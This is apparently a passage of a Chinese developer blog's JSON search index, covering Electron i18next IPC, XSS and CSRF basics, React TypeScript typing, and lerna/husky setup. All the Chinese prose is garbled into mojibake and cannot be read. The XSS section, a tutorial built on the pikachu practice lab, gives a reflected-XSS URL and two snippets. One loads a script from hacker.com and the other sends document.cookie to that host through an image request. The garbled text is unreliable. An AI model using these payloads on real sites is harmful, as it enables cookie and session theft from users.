ä¸ŠæŒ‚è½½çš„å˜é‡å’Œä¸»è¿›ç¨‹åŒå‘é€šè¡Œ 123456export const invokeCommand = &lt;T&gt;(type: string, payload = &#123;&#125;) =&gt; &#123; return window.api.invoke&lt;T&gt;(&quot;fromRenderer&quot;, &#123; type, payload, &#125;);&#125;; æ¸²æŸ“è¿›ç¨‹é€šè¿‡ invokeCommand è°ƒç”¨ä¸»è¿›ç¨‹çš„ getI18nInitResource æ–¹æ³•è·å–åˆå§‹çš„è¯­è¨€å’Œæ–‡æ¡ˆå®Œæˆå®ä¾‹çš„åˆå§‹åŒ–ã€‚ç”¨æˆ·åˆ‡æ¢è¯­è¨€æ—¶ï¼ŒåŒæ ·é€šè¿‡è¿›ç¨‹é€šä¿¡è·å–æ–°è¯­è¨€çš„æ–‡æ¡ˆï¼Œé€šè¿‡ i18next.addResourceBundleåŠ¨æ€åŠ è½½åˆ°å®ä¾‹ä¸­ï¼Œè°ƒç”¨ i18next.changeLanguageå®Œæˆè¯­è¨€çš„åˆ‡æ¢ã€‚ 1234567891011121314151617181920212223242526272829303132333435import i18next, &#123; ResourceKey &#125; from &quot;i18next&quot;;import &#123; initReactI18next &#125; from &quot;react-i18next&quot;;import &#123; invokeCommand &#125; from &quot;@/commands&quot;;export const initI18next = async () =&gt; &#123; const &#123; lng, resource &#125; = await invokeCommand&lt;&#123; lng: string; resource: ResourceKey; &#125;&gt;(&quot;getI18nInitResource&quot;); return i18next.use(initReactI18next).init(&#123; lng, resources: &#123; [lng]: &#123; translation: resource, &#125;, &#125;, interpolation: &#123; escapeValue: false, &#125;, &#125;);&#125;;export const changeLanguage = async (lng: string) =&gt; &#123; if (!i18next.hasResourceBundle(lng, &quot;translation&quot;)) &#123; // åŠ¨æ€åŠ è½½è¯­è¨€ const resource = await invokeCommand&lt;ResourceKey&gt;(&quot;getI18nResource&quot;, lng); i18next.addResourceBundle(lng, &quot;translation&quot;, resource); &#125; return i18next.changeLanguage(lng);&#125;;export default i18next; æ€»ç»“ï¼šelectron çš„å¤šè¿›ç¨‹æœºåˆ¶å¯¼è‡´ i18next ä¸å¾—ä¸åˆå§‹åŒ–å‡ºå¤šä¸ªå®ä¾‹ï¼Œä½†æ˜¯æˆ‘ä»¬åŒæ ·å¯ä»¥åˆ©ç”¨è¿›ç¨‹é€šä¿¡ï¼Œè®©ä¸€ä¸ªå®ä¾‹åŠ è½½æ–‡æ¡ˆï¼Œå†åŒæ­¥åˆ°å¦ä¸€ä¸ªå®ä¾‹ï¼Œå®ç°æ–‡æ¡ˆçš„é›†ä¸­ç®¡ç†ã€‚","tags":["React","i18next","Electron"],"categories":["React","Electron"]},{"title":"XSSå’ŒCSRFçš„åŒºåˆ«åŠé˜²å¾¡","path":"/2022/03/08/7948600e1d25/","content":"åœ¨ Web å®‰å…¨é¢†åŸŸï¼ŒXSS å’Œ CSRF æ˜¯ä¸ªè€ç”Ÿå¸¸è°ˆçš„éƒ½è¡Œäº†ï¼Œç‰¹åˆ«æ˜¯é¢è¯•çš„æ—¶å€™ï¼Œä½†æ˜¯è¿˜æ˜¯æœ‰å¾ˆå¤šåŒå­¦å°†å®ƒä»¬ææ··ã€‚æœ¬æ–‡å°†ç®€å•çš„ä»‹ç»ä¸‹å®ƒä»¬çš„åŒºåˆ«ï¼Œä»¥åŠå¸¸è§çš„é˜²å¾¡æ‰‹æ®µã€‚ ä»‹ç»ä¹‹å‰ï¼Œå…ˆä¸Šä¸‹ç»´åŸºç™¾ç§‘ï¼š XSSï¼šè·¨ç«™è„šæœ¬ï¼ˆCross-site scriptingï¼Œé€šå¸¸ç®€ç§°ä¸ºXSSï¼‰æ˜¯ä¸€ç§ç½‘ç«™åº”ç”¨ç¨‹åºçš„å®‰å…¨æ¼æ´æ”»å‡»ï¼Œæ˜¯ä»£ç æ³¨å…¥çš„ä¸€ç§ã€‚å®ƒå…è®¸æ¶æ„ç”¨æˆ·å°†ä»£ç æ³¨å…¥åˆ°ç½‘é¡µä¸Šï¼Œå…¶ä»–ç”¨æˆ·åœ¨è§‚çœ‹ç½‘é¡µæ—¶å°±ä¼šå—åˆ°å½±å“ã€‚è¿™ç±»æ”»å‡»é€šå¸¸åŒ…å«äº†HTMLä»¥åŠç”¨æˆ·ç«¯è„šæœ¬è¯­è¨€ã€‚ CSRF:è·¨ç«™è¯·æ±‚ä¼ªé€ ï¼ˆè‹±è¯­ï¼šCross-site request forgeryï¼‰ï¼Œä¹Ÿè¢«ç§°ä¸º one-click attack æˆ–è€… session ridingï¼Œé€šå¸¸ç¼©å†™ä¸º CSRF æˆ–è€… XSRFï¼Œ æ˜¯ä¸€ç§æŒŸåˆ¶ç”¨æˆ·åœ¨å½“å‰å·²ç™»å½•çš„Webåº”ç”¨ç¨‹åºä¸Šæ‰§è¡Œéæœ¬æ„çš„æ“ä½œçš„æ”»å‡»æ–¹æ³•ã€‚ XSSç”¨â€œäººè¯è¯´â€ï¼ŒXSS å°±æ˜¯æ¶æ„æ”»å‡»è€…å¾€ Web é¡µé¢é‡Œæ’å…¥æ¶æ„ Script ä»£ç ï¼Œå½“ç”¨æˆ·æµè§ˆè¯¥é¡µä¹‹æ—¶ï¼ŒåµŒå…¥å…¶ä¸­ Web é‡Œé¢çš„ Script ä»£ç ä¼šè¢«æ‰§è¡Œï¼Œä»è€Œè¾¾åˆ°æ¶æ„æ”»å‡»ç”¨æˆ·çš„ç›®çš„ã€‚ XSSæ”»å‡»å¯ä»¥åˆ†ä¸º3ç±»ï¼šåå°„å‹ï¼ˆéæŒä¹…å‹ï¼‰ã€å­˜å‚¨å‹ï¼ˆæŒä¹…å‹ï¼‰ã€åŸºäºDOMã€‚ åå°„å‹åå°„å‹æ˜¯æŒ‡xssä»£ç åœ¨è¯·æ±‚çš„urlä¸­ï¼Œè€Œåæäº¤åˆ°æœåŠ¡å™¨ï¼ŒæœåŠ¡å™¨è§£æåï¼ŒXSSä»£ç éšç€å“åº”å†…å®¹ä¸€èµ·ä¼ ç»™å®¢æˆ·ç«¯è¿›è¡Œè§£ææ‰§è¡Œã€‚ï¼ˆç›´æ¥åå°„æ˜¾ç¤ºåœ¨é¡µé¢ï¼‰ æµç¨‹å›¾å¦‚ä¸‹ï¼š é€šè¿‡æµç¨‹å›¾å¯ä»¥å¾ˆå®¹æ˜“çŸ¥é“å­˜å‚¨å‹XSSçš„å¸¸ç”¨æ”»å‡»æµç¨‹ä¸ºï¼šæ”»å‡»è€…æ„é€ å¸¦æœ‰æ¶æ„XSSä»£ç çš„URLâ€”&gt;åˆ«çš„ç”¨æˆ·è®¿é—®è¿™ä¸ªURLâ€”&gt;æ¶æ„ä»£ç è¢«æœåŠ¡å™¨è§£æâ€”&gt;ä¼ é€’ç»™å‰ç«¯æ¸²æŸ“å®ç°æ”»å‡»ã€‚ å¦‚æœä½ æƒ³ææ‡‚ä¸€ä¸ªæ¼æ´ï¼Œæ¯”è¾ƒå¥½çš„æ–¹æ³•æ˜¯ï¼šä½ å¯ä»¥è‡ªå·±å…ˆåˆ¶é€ å‡ºè¿™ä¸ªæ¼æ´ï¼ˆç”¨ä»£ç ç¼–å†™ï¼‰ï¼Œç„¶åå†åˆ©ç”¨å®ƒï¼Œæœ€åå†ä¿®å¤å®ƒ pikachuï¼Œæ˜¯ä¸ªå¼€æºçš„æ¼æ´æµ‹è¯•å¹³å°ï¼ŒæŒ‰ç…§ README å¯åŠ¨é¡¹ç›®åï¼Œè·³è½¬åˆ°ã€Œåå°„å‹xssã€é¡µé¢ï¼Œåœ¨è¾“å…¥æ¡†ä¸­è¾“å…¥ã€Œkobeã€åï¼Œç‚¹å‡» submitï¼Œæ‰“å¼€æ§åˆ¶å°ï¼Œè§‚å¯Ÿåç«¯è¿”å›çš„ htmlï¼š å¯ä»¥çœ‹åˆ°ï¼Œè¾“å…¥æ¡†çš„å†…å®¹å‡ºç°åœ¨ html å’Œé“¾æ¥é‡Œï¼Œè¿™å°±ç»™æˆ‘ä»¬å¸¦æ¥äº†å¯ä¹˜ä¹‹æœºï¼Œå¦‚æœè¾“å…¥æ¡†é‡Œè¾“å…¥çš„æ˜¯ä¸€æ®µ script è„šæœ¬å‘¢ï¼Ÿ è„šæœ¬è¢«æ’å…¥åˆ° htmlhä¸­ï¼Œå¹¶ä¸”è¢«æ‰§è¡Œã€‚è¿™æ—¶å°†è¿™æ®µé“¾æ¥ http://localhost:8095/vul/xss/xss_reflected_get.php?message=%3Cscript%3Ealert%28document.cookie%29%3C%2Fscript%3E&amp;submit=submit# å‘é€ç»™ç”¨æˆ·ï¼Œè¯±å¯¼ç”¨æˆ·ç‚¹å‡»ï¼Œå°±å®Œæˆäº†ä¸€æ¬¡ XSS æ”»å‡»ã€‚ ç°åœ¨çš„è„šæœ¬åªæ˜¯ alert ç”¨æˆ·çš„ cookieï¼Œè¿˜åœç•™åœ¨æ¶æçš„å±‚é¢ï¼Œå¦‚æœå°† cookie å‘é€åˆ°æ¶æ„æ”»å‡»è€…çš„æœåŠ¡å™¨ä¸Šï¼Œé‚£å°±æ˜¯ä¸€èµ·ä¸¥é‡çš„å®‰å…¨äº‹æ•…äº†ã€‚ 1&lt;script src=&quot;http://hacker.com/hacker.js&quot;&gt;&lt;/script&gt; 123var img = new Image();img.src = &quot;http://hacker.com/hack.png?q=&quot; + document.cookie;document.body.append(img); å­˜å‚¨å‹å­˜å‚¨å‹ XSS ä¼šæŠŠç”¨æˆ·è¾“å…¥çš„æ•°æ® â€œå­˜å‚¨â€ åœ¨æœåŠ¡å™¨ç«¯ï¼Œå½“æµè§ˆå™¨è¯·æ±‚æ•°æ®æ—¶ï¼Œè„šæœ¬ä»æœåŠ¡å™¨ä¸Šä¼ å›å¹¶æ‰§è¡Œã€‚è¿™ç§ XSS æ”»å‡»å…·æœ‰å¾ˆå¼ºçš„ç¨³å®šæ€§ã€‚ åå°„å‹ XSS æ¯æ¬¡æ”»å‡»è¿˜éœ€è¦è¯±å¯¼ç”¨æˆ·ç‚¹å‡»è¯±é¥µé“¾æ¥ï¼Œå¦‚æœç”¨æˆ·æ— åŠ¨äºè¡·ï¼Œæ”»å‡»è€…ä¹Ÿæ˜¯æ— å¯å¥ˆä½•ï¼Œè€Œå­˜å‚¨å‹ XSS ä¸€æ—¦å°†æ¶æ„è„šæœ¬å…¥åº“äº†ï¼Œä»»ä½•è®¿é—®åˆ°è¿™æ®µè„šæœ¬ç”¨æˆ·éƒ½ä¼šä¸­æ‹›ã€‚ æ¯”è¾ƒå¸¸è§çš„ä¸€ä¸ªåœºæ™¯æ˜¯æ”»å‡»è€…åœ¨ç¤¾åŒºæˆ–è®ºå›ä¸Šå†™ä¸‹ä¸€ç¯‡åŒ…å«æ¶æ„ JavaScript ä»£ç çš„æ–‡ç« æˆ–è¯„è®ºï¼Œæ–‡ç« æˆ–è¯„è®ºå‘è¡¨åï¼Œæ‰€æœ‰è®¿é—®è¯¥æ–‡ç« æˆ–è¯„è®ºçš„ç”¨æˆ·ï¼Œéƒ½ä¼šåœ¨ä»–ä»¬çš„æµè§ˆå™¨ä¸­æ‰§è¡Œè¿™æ®µæ¶æ„çš„ JavaScript ä»£ç ã€‚ æµç¨‹å›¾å¦‚ä¸‹ï¼š é€šè¿‡æµç¨‹å›¾å¯ä»¥å¾ˆå®¹æ˜“çŸ¥é“å­˜å‚¨å‹XSSçš„å¸¸ç”¨æ”»å‡»æµç¨‹ä¸ºï¼šæ”»å‡»è€…å‰ç«¯æ’å…¥æ¶æ„XSSä»£ç â€”&gt;åç«¯ä¸åšå¤„ç†ä¼ å…¥æ•°æ®åº“â€”&gt;åˆ«çš„ç”¨æˆ·è®¿é—®é¡µé¢â€”&gt;åç«¯ä»æ•°æ®åº“ä¸­è°ƒç”¨XSSä»£ç â€”&gt;å‰ç«¯æ¸²æŸ“(æ‰§è¡Œjsè„šæœ¬)æ¶æ„ä»£ç å®ç°æ”»å‡»ã€‚ è¿™é‡Œè¿˜æ˜¯ç”¨ pikachu æ¥å®æ“ä¸‹ï¼Œæ‰“å¼€ã€Œå­˜å‚¨å‹xssã€é¡µé¢ï¼Œè¾“å…¥æ¡†ä¸­è¾“å…¥ä¸€æ®µ script è„šæœ¬ï¼š æäº¤åå¹¶åˆ·æ–°é¡µé¢ï¼Œè¿™æ®µè„šæœ¬è¢«æ³¨å…¥åˆ° html ä¸­ï¼Œå¹¶æ‰§è¡Œäº†"},{"title":"åœ¨ React é¡¹ç›®ä¸­ä¼˜é›…åœ°ä½¿ç”¨ Typescript","path":"/2021/04/19/368700e46601/","content":"TypeScript æ˜¯ Javascript çš„è¶…é›†ï¼Œæ‰©å±•äº† JavaScript çš„è¯­æ³•ï¼Œç»™ JavaScript å¸¦æ¥äº†é™æ€ç±»å‹æ”¯æŒï¼Œäº†è§£å¦‚ä½•åœ¨ React é¡¹ç›®ä¸­ä¼˜é›…åœ°ä½¿ç”¨ Typescriptï¼Œèƒ½å¸®åŠ©æˆ‘ä»¬å†™å‡ºæ›´ä¼˜é›…çš„ä»£ç ã€‚ ã€Œä¼˜é›…ã€çš„å«ä¹‰ï¼š å‡å°‘ç¼–å†™å†—ä½™çš„ç±»å‹å®šä¹‰ã€ç±»å‹æ ‡æ³¨ï¼Œå……åˆ†åˆ©ç”¨tsçš„è‡ªåŠ¨ç±»å‹æ¨æ–­ï¼Œä»¥åŠå¤–éƒ¨æä¾›çš„ç±»å‹å£°æ˜ã€‚ ç±»å‹å®‰å…¨ï¼šæä¾›è¶³å¤Ÿçš„ç±»å‹ä¿¡æ¯æ¥é¿å…è¿è¡Œæ—¶é”™è¯¯ï¼Œè®©é”™è¯¯æš´éœ²åœ¨å¼€å‘æœŸã€‚è¿™äº›ç±»å‹ä¿¡æ¯åŒæ—¶èƒ½å¤Ÿæä¾›ä»£ç è¡¥å…¨ã€è·³è½¬åˆ°å®šä¹‰ç­‰åŠŸèƒ½ã€‚ ç»„ä»¶å®šä¹‰å‡½æ•°ç»„ä»¶1234567891011121314151617import * as React from &#x27;react&#x27;;// å¦‚æœåœ¨tsconfigä¸­è®¾ç½®äº†&quot;allowSyntheticDefaultImports&quot;: true// ä½ è¿˜å¯ä»¥æ›´ç²¾ç»ƒåœ°import reactï¼š// import React from &quot;react&quot;;interface IProps &#123; // CSSPropertiesæä¾›æ ·å¼å£°æ˜çš„ç±»å‹ä¿¡æ¯ // ç”¨æˆ·ä¼ å…¥styleçš„æ—¶å€™å°±èƒ½å¤Ÿè·å¾—ç±»å‹æ£€æŸ¥å’Œä»£ç è¡¥å…¨ style?: React.CSSProperties; // ä½¿ç”¨@types/reactæä¾›çš„äº‹ä»¶ç±»å‹å®šä¹‰ï¼Œè¿™é‡ŒæŒ‡å®ševent.targetçš„ç±»å‹æ˜¯HTMLButtonElement onClick(event: React.MouseEvent&lt;HTMLButtonElement&gt;): void; // ...&#125;const MyComponent: React.FC&lt;IProps&gt; = (props) =&gt; &#123; const &#123; children, ...restProps &#125; = props; return &lt;div &#123;...restProps&#125;&gt;&#123;children&#125;&lt;/div&gt;;&#125; FCæ˜¯FunctionComponentçš„ç¼©å†™ã€‚ IPropsæ— éœ€å£°æ˜childrenå±æ€§çš„ç±»å‹ã€‚React.FCä¼šè‡ªåŠ¨ä¸ºpropsæ·»åŠ è¿™ä¸ªå±æ€§ç±»å‹ã€‚å½“ç„¶ï¼Œå¦‚æœchildrenæœŸæœ›ä¸€ä¸ªrender propï¼Œæˆ–è€…æœŸæœ›å…¶ä»–ç‰¹æ®Šçš„å€¼ï¼Œé‚£ä¹ˆä½ è¿˜æ˜¯è¦è‡ªå·±ç»™childrenå£°æ˜ç±»å‹ï¼Œè€Œä¸æ˜¯ä½¿ç”¨é»˜è®¤çš„React.ReactNodeã€‚ propsæ— éœ€åšç±»å‹æ ‡æ³¨ã€‚ å‡½æ•°ç»„ä»¶defaultPropsï¼ˆDeprecateï¼‰å¦‚æœä½ éœ€è¦å®šä¹‰defaultPropsï¼Œé‚£ä¹ˆä¸è¦ä½¿ç”¨React.FCï¼Œå› ä¸ºReact.FCå¯¹defaultPropsçš„æ”¯æŒä¸æ˜¯å¾ˆå¥½ï¼š 1234567const defaultProps = &#123; who: &quot;Johny Five&quot;&#125;;type IProps = &#123; age: number &#125; &amp; typeof defaultProps;export const Greet = (props: IProps) =&gt; &#123; return &lt;div&gt;123&lt;/div&gt; &#125;;Greet.defaultProps = defaultProps; äº‹å®ä¸Šï¼Œä¸€ä¸ªæè®®åœ¨å‡½æ•°ç»„ä»¶ä¸­åºŸå¼ƒdefaultPropsçš„React rfcå·²ç»è¢«æ¥å—ï¼Œæ‰€ä»¥ä»¥åè¿˜æ˜¯å°½é‡å‡å°‘åœ¨å‡½æ•°ç»„ä»¶ä¸Šä½¿ç”¨defaultPropsï¼Œä½¿ç”¨ES6åŸç”Ÿçš„å‚æ•°è§£æ„+é»˜è®¤å‚æ•°ç‰¹æ€§å°±å·²ç»èƒ½å¤Ÿæ»¡è¶³éœ€è¦ï¼š 1const TestFunction: FunctionComponent&lt;Props&gt; = (&#123; foo = &quot;bar&quot; &#125;) =&gt; &lt;div&gt;&#123;foo&#125;&lt;/div&gt; ç±»ç»„ä»¶12345678910111213141516171819interface IProps &#123; message: string;&#125;interface IState &#123; count: number;&#125;export class MyComponent extends React.Component&lt;IProps, IState&gt; &#123; state: IState = &#123; // duplicate IState annotation for better type inference count: 0 &#125;; render() &#123; return ( &lt;div&gt; &#123;this.props.message&#125; &#123;this.state.count&#125; &lt;/div&gt; ); &#125;&#125; å¦‚æœä½ é€šè¿‡å£°æ˜stateå±æ€§æ¥åˆå§‹åŒ–stateï¼Œé‚£ä¹ˆä½ éœ€è¦ä¸ºè¿™ä¸ªå±æ€§å¢åŠ IStateç±»å‹æ ‡æ³¨ã€‚è™½ç„¶è¿™ä¸å‰é¢çš„React.Component&lt;IProps, IState&gt;æœ‰é‡å¤çš„å«Œç–‘ï¼Œä½†æ˜¯è¿™ä¸¤è€…å®é™…ä¸Šæ˜¯ä¸åŒçš„ï¼š React.Component&lt;IProps, IState&gt;åªæ˜¯æ ‡æ³¨äº†åŸºç±»çš„stateå±æ€§ç±»å‹ã€‚ è€Œå½“ä½ åœ¨å­ç±»å£°æ˜stateæ—¶ï¼Œä½ å¯ä»¥ä¸ºstateæ ‡æ³¨ä¸€ä¸ªã€IStateçš„å­ç±»å‹ã€‘ä½œä¸ºoverrideã€‚è¿™æ ·ï¼Œthis.stateä¼šä»¥å­ç±»ä¸­çš„stateå±æ€§å£°æ˜ä½œä¸ºç±»å‹ä¿¡æ¯çš„æ¥æºã€‚ å»ºè®®ä½¿ç”¨å‡½æ•°ç»„ä»¶ã€‚ å¯æ¸²æŸ“èŠ‚ç‚¹ç±»å‹å¯æ¸²æŸ“èŠ‚ç‚¹å°±æ˜¯ï¼šå¯ä»¥ç›´æ¥è¢«ç»„ä»¶æ¸²æŸ“å‡½æ•°è¿”å›çš„å€¼ã€‚ ä¸å¯æ¸²æŸ“èŠ‚ç‚¹æœ‰å…³çš„ç±»å‹å®šä¹‰å¦‚ä¸‹ï¼ˆæ‘˜å½•è‡ª[@types&#x2F;react](https://github.com/DefinitelyTyped/DefinitelyTyped/blob/8a1b68be3a64e5d2aa1070f68cc935d668a976ad/types/react/index.d.ts#L187ï¼‰ï¼š 12345type ReactText = string | number;type ReactChild = ReactElement | ReactText;interface ReactNodeArray extends Array&lt;ReactNode&gt; &#123;&#125;type ReactFragment = &#123;&#125; | ReactNodeArray;type ReactNode = ReactChild | ReactFragment | ReactPortal | boolean | null | undefined; ç»„ä»¶ç±»å‹ React.FC&lt;Props&gt;ï¼ˆå³ React.FunctionComponent&lt;Props&gt;ï¼‰ React.Component&lt;Props, State&gt; React.ComponentType&lt;Props&gt;ï¼ˆå³ComponentClass&lt;P&gt; | FunctionComponent&lt;P&gt;ï¼‰ åœ¨å†™HOCçš„æ—¶å€™ç»å¸¸ç”¨åˆ°ã€‚ 123const withState = &lt;P extends WrappedComponentProps&gt;( WrappedComponent: React.ComponentType&lt;P&gt;,) =&gt; &#123; ... è·å–å¹¶æ‰©å±•åŸç”Ÿå…ƒç´ çš„propsç±»å‹æ¯”å¦‚ï¼Œä»¥ä¸‹ä¾‹å­è·å–å¹¶æ‰©å±•äº†&lt;button&gt;çš„propsç±»å‹ï¼š 123export const PrimaryButton = ( props: Props &amp; React.HTMLProps&lt;HTMLButtonElement&gt;) =&gt; &lt;Button size=&#123;ButtonSizes.default&#125; &#123;...props&#125; /&gt;; PrimaryButtonèƒ½å¤Ÿæ¥å—æ‰€æœ‰åŸç”Ÿ&lt;button&gt;æ‰€æ¥å—çš„propsã€‚å…³é”®åœ¨äºReact.HTMLPropsã€‚ è·å–å¹¶æ‰©å±•ç¬¬ä¸‰æ–¹ç»„ä»¶çš„propsç±»å‹123456import &#123; Button &#125; from &quot;library&quot;; // but doesn&#x27;t export ButtonProps! oh no!type ButtonProps = React.ComponentProps&lt;typeof Button&gt;; // no problem! grab your own!type AlertButtonProps = Omit&lt;ButtonProps, &quot;onClick&quot;&gt;; // modifyconst AlertButton: React.FC&lt;AlertButtonProps&gt; = props =&gt; ( &lt;Button onClick=&#123;() =&gt; alert(&quot;hello&quot;)&#125; &#123;...props&#125; /&gt;); äº‹ä»¶ç±»å‹@types/reactæä¾›äº†å„ç§äº‹ä»¶çš„ç±»å‹ï¼Œæ¯”å¦‚ä»¥ä¸‹æ˜¯ä½¿ç”¨React.FormEventçš„ä¾‹å­ï¼š 1234567891011121314151617181920class App extends React.Component&lt; &#123;&#125;, &#123; text: string &#125;&gt; &#123; state = &#123; text: &#x27;&#x27;, &#125; onChange = (e: React.FormEvent&lt;HTMLInputElement&gt;): void =&gt; &#123; this.setState(&#123; text: e.currentTarget.value &#125;) &#125; render() &#123; return ( &lt;div&gt; &lt;input type=&quot;text&quot; value=&#123;this.state.text&#125; onChange=&#123;this.onChange&#125; /&gt; &lt;/div&gt; ) &#125;&#125; åœ¨Reactä¸­ï¼Œæ‰€æœ‰äº‹ä»¶ï¼ˆåŒ…æ‹¬FormEventã€KeyboardEventã€MouseEventç­‰ï¼‰éƒ½æ˜¯SyntheticEventçš„å­ç±»å‹ã€‚ä»–ä»¬åœ¨@types&#x2F;reactä¸­å®šä¹‰å¦‚ä¸‹ï¼š 12345678910111213141516171819202122232425262728293031// DOMäº‹ä»¶çš„åŸºæœ¬å±æ€§éƒ½å®šä¹‰åœ¨è¿™é‡Œinterface BaseSyntheticEvent&lt;E = object, C = any, T = any&gt; &#123; nativeEvent: E; currentTarget: C; target: T; bubbles: boolean; cancelable: boolean; defaultPrevented: boolean; eventPhase: number; isTrusted: boolean; preventDefault(): void; isDefaultPrevented(): boolean; stopPropagation(): void; isPropagationStopped(): boolean; persist(): void; timeStamp: number; type: string;&#125;interface SyntheticEvent&lt;T = Element, E = Event&gt; extends BaseSyntheticEvent&lt;E, EventTarget &amp; T, EventTarget&gt; &#123;&#125;// å…·ä½“çš„äº‹ä»¶ç±»å‹ï¼šinterface FormEvent&lt;T = Element&gt; extends SyntheticEvent&lt;T&gt; &#123;&#125;interface KeyboardEvent&lt;T = Element&gt; extends SyntheticEvent&lt;T, NativeKeyboardEvent&gt; &#123; altKey: boolean; // ...&#125;interface MouseEvent&lt;T = Element, E = NativeMouseEvent&gt; extends SyntheticEvent&lt;T, E&gt; &#123; altKey: boolean; // ...&#125;// ...","tags":["React"],"categories":["React"]},{"title":"lernaé¡¹ç›®ä¸­é›†æˆhuskyã€lint-stagedã€commitlintå’Œcz-customizable","path":"/2021/04/02/b727669177ea/","content":"Monorepo æ˜¯é’ˆå¯¹å•ä»“åº“ã€å¤š package çš„æµè¡Œè§£å†³æ–¹æ¡ˆ, lerna æ˜¯å®ƒçš„ä¸€ç§å®ç°ã€‚ è¯´æ˜é‡è¦packageç‰ˆæœ¬è¯´æ˜ï¼š â€œhuskyâ€: â€œ^6.0.0â€ â€œlint-stagedâ€: â€œ^10.5.4â€ â€œ@commitlint&#x2F;cliâ€: â€œ^12.0.1â€ â€œ@commitlint&#x2F;config-conventionalâ€: â€œ^12.0.1â€ â€œcz-customizableâ€: â€œ^6.3.0â€ é…ç½®huskyåœ¨lernaé¡¹ç›®æ ¹ç›®å½•ä¸­å®‰è£…husky: 1yarn add husky -D æ³¨æ„ï¼šhusky v4å’Œv6ç‰ˆæœ¬çš„é…ç½®æ–¹å¼å¤§ç›¸å¾„åº­ï¼Œè¿™é‡Œåªä»‹ç»v6ç‰ˆæœ¬çš„é…ç½®æ–¹å¼ï¼Œv4çš„ç½‘ä¸Šä¸€æœä¸€å¤§æŠŠï¼Œè¿™é‡Œä¸è¿‡å¤šä»‹ç» åœ¨package.jsonçš„scriptsä¸­æ·»åŠ &quot;prepare&quot;: &quot;husky install&quot;ï¼Œå¹¶è¿è¡Œè¿™æ¡å‘½ä»¤ï¼š 1npm set-script prepare &quot;husky install&quot; &amp;&amp; npm run prepare æ·»åŠ ä¸€ä¸ªhook: 1npx husky add .husky/pre-commit &quot;npm test&quot; ä¸Šé¢è¿™ä¸ªå‘½ä»¤ä¼šåœ¨.huskyç›®å½•ä¸‹æ–°å»ºä¸€ä¸ªpre-commitæ–‡ä»¶ï¼Œå…¶å†…å®¹å¦‚ä¸‹ï¼š 12345#!/bin/sh. &quot;$(dirname &quot;$0&quot;)/_/husky.sh&quot;npm test ä»¥ä¸Šéƒ½æ˜¯æ‰‹åŠ¨å®‰è£…huskyçš„è¿‡ç¨‹ï¼Œå½“ç„¶å®˜æ–¹ä¹Ÿæä¾›äº†ä¸€é”®å®‰è£…å’Œé…ç½®è„šæœ¬ï¼Œæ¨èä½¿ç”¨ï¼š 123npx husky-init &amp;&amp; npm install # npmnpx husky-init &amp;&amp; yarn # Yarn 1yarn dlx husky-init --yarn2 &amp;&amp; yarn # Yarn 2 å¦‚æœä½¿ç”¨çš„æ˜¯v4ç‰ˆæœ¬çš„huskyï¼Œæƒ³å‡çº§åˆ°v6ï¼Œå¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‘½åï¼Œä¸€é”®è¿ç§»ï¼š 1234567891011121314// npmnpm install husky@6 --save-dev \\ &amp;&amp; npx husky-init \\ &amp;&amp; npm exec -- github:typicode/husky-4-to-6 --remove-v4-config // yarn 1yarn add husky@6 --dev \\ &amp;&amp; npx husky-init \\ &amp;&amp; npm exec -- github:typicode/husky-4-to-6 --remove-v4-config// yarn 2yarn add husky@6 --dev \\ &amp;&amp; yarn dlx husky-init --yarn2 \\ &amp;&amp; npm exec -- github:typicode/husky-4-to-6 --remove-v4-config æ›´å¤šé…ç½®ï¼Œè¯¦è§å®˜æ–¹æ–‡æ¡£ï¼šhttps://typicode.github.io/husky/#/ é…ç½®lint-stagedåœ¨lernaé¡¹ç›®ä¸­ï¼Œç”±äºæ‰€æœ‰å­é¡¹ç›®å…¬ç”¨ä¸€ä¸ª repo æºä»£ç ä»“åº“ï¼Œå› æ­¤å®ƒçš„ husky é’©å­åªèƒ½å»ºç«‹åœ¨æœ€é¡¶å±‚ç›®å½•ï¼› è€Œæ¯æ¬¡ commit éƒ½å¾ˆæœ‰å¯èƒ½æ˜¯å¤šä¸ªå­é¡¹ç›®éƒ½æœ‰æ”¹åŠ¨ï¼Œè¿™ä¸ªæ—¶å€™ä½¿ç”¨ lint-staged æ—¶ï¼Œå°±ä¸ä½†è¦åŒºåˆ†æ–‡ä»¶ç±»å‹ï¼Œè¿˜è¦åŒºåˆ†æ”¹åŠ¨æ–‡ä»¶æ‰€åœ¨çš„å­é¡¹ç›®ï¼ˆå› ä¸ºä¸åŒçš„å­é¡¹ç›®å¯èƒ½ä¼šæœ‰ä¸åŒçš„æ ¡éªŒå¤„ç†ï¼‰ã€‚ è¿™æ—¶ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ lerna å‘½ä»¤æ¥å®ç°å¯¹â€œå“ªä¸ªå­é¡¹ç›®æœ‰ä¿®æ”¹â€çš„åˆ¤æ–­ï¼›è€Œ lint-staged å°±éœ€è¦å®‰è£…åœ¨ä»»ä½•ä¸€ä¸ªéœ€è¦åšæ ¡éªŒçš„å­é¡¹ç›®ä¸­ã€‚ æ·»åŠ æˆ–ä¿®æ”¹.huskyç›®å½•ä¸‹çš„pre-commité’©å­å¦‚ä¸‹ï¼š 12345#!/bin/sh. &quot;$(dirname &quot;$0&quot;)/_/husky.sh&quot;lerna run --concurrency 1 --stream precommit --since HEAD --exclude-dependents å…¶ä¸­ï¼Œprecommit æ˜¯åœ¨pre-commité’©å­ä¸­è§¦å‘çš„å­é¡¹ç›®çš„å‘½ä»¤ åœ¨å­é¡¹ç›®ä¸­å®‰è£…å’Œé…ç½®lint-stagedï¼Œå¹¶æ·»åŠ precommitå‘½ä»¤ å®‰è£…lint-stagedï¼š 1lerna add lint-staged --scope=xxxx -D åœ¨æ·»åŠ precommitå‘½ä»¤ï¼š 1&quot;precommit&quot;: &quot;lint-staged&quot; é…ç½®lint-stagedï¼š 12345&quot;lint-staged&quot;: &#123; &quot;*.&#123;ts,tsx,js,jsx&#125;&quot;: [ &quot;eslint&quot; ]&#125;, æ›´å¤šé…ç½®ï¼Œè¯¦è§å®˜æ–¹æ–‡æ¡£ï¼šhttps://github.com/okonet/lint-staged#readme é…ç½®commitlintå’Œcz-customizableæ¯ä¸ªå›¢é˜Ÿå¯¹æäº¤çš„commit messageæ ¼å¼æœ‰çº¦å®šä¿—ç§°çš„è¦æ±‚ï¼Œä½†æ˜¯æ²¡æœ‰ä¸€ä¸ªç»Ÿä¸€çš„è§„èŒƒï¼Œå¯¼è‡´å¤§å®¶æäº¤çš„commit messageæˆ–å¤šæˆ–å°‘ä¸å¤ªä¸€æ ·ã€‚å› 